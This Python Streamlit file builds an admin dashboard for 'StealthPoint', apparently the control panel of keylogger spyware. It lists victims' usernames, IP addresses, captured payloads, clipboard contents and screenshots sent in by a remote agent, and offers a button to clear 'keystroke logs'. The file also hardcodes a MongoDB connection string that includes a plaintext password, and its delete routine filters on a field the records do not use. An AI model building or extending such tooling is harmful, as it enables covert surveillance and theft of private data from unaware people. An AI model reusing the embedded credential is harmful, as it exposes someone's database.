import streamlit as st
import pandas as pd
from pymongo import MongoClient
import plotly.express as px

# --- CONFIGURATION ---
st.set_page_config(page_title="StealthPoint Admin Dashboard", layout="wide")

# Replace this with your actual connection string from MongoDB Atlas
MONGO_URI = "mongodb+srv://vanshgupta1285_db_user:xdl9NngTThUO1Hc3@stealthp.uersuk0.mongodb.net/?appName=StealthP"



@st.cache_resource
def get_connect():
    client = MongoClient(MONGO_URI)
    return client["Stealthpoint_DB"]

db = get_connect()
collection = db["logs"]

# --- SIDEBAR FILTERS ---
st.sidebar.title("🔍 Search Filters")
user_search = st.sidebar.text_input("Search by Username")
ip_search = st.sidebar.text_input("Search by IP Address")

# --- MAIN DASHBOARD ---
st.title("🛡️ StealthPoint: Monitoring Dashboard")
st.markdown("---")

# Fetch Data from MongoDB
data = list(collection.find().sort("_id", -1)) # Latest logs first

if data:
    df = pd.DataFrame(data)
    
    # Cleaning data for display
    if '_id' in df.columns:
        df['_id'] = df['_id'].astype(str)

    # Apply Filters
    if user_search:
        df = df[df['username'].str.contains(user_search, case=False)]
    if ip_search:
        df = df[df['ip_address'].str.contains(ip_search)]

    # --- METRICS ---
    col1, col2, col3 = st.columns(3)
    col1.metric("Total Logs", len(df))
    col2.metric("Unique Users", df['username'].nunique())
    col3.metric("Total IPs", df['ip_address'].nunique())

    # --- LOG TABLE ---
    st.subheader("📋 Recent Activity Logs")
    st.dataframe(df[['timestamp', 'username', 'ip_address', 'payload', 'clipboard']], use_container_width=True)

    # --- VISUAL SURVEILLANCE (Screenshots) ---
    st.subheader("📸 Captured Visuals")
    # This assumes you store screenshots as Base64 strings in the 'screenshot' field
    if 'screenshot' in df.columns:
        selected_user = st.selectbox("View Screenshots for:", df['username'].unique())
        user_screenshots = df[df['username'] == selected_user]
        
        cols = st.columns(4)
        for i, row in user_screenshots.iterrows():
            if row['screenshot']:
                with cols[i % 4]:
                    st.image(row['screenshot'], caption=f"Time: {row['timestamp']}")
    else:
        st.info("No screenshots found in database yet.")

else:
    st.warning("No logs found in MongoDB. Ensure your agent is running and syncing data.")

target_user = st.sidebar.text_input("enter the ip to delete logs for")
st.sidebar.subheader("⚠️ Danger Zone")
if st.sidebar.button("🗑️ Clear All Keystroke Logs"):
    result = db["logs"].delete_many({"ip": target_user})
    st.sidebar.success(f"Deleted {result.deleted_count} log entries.")
    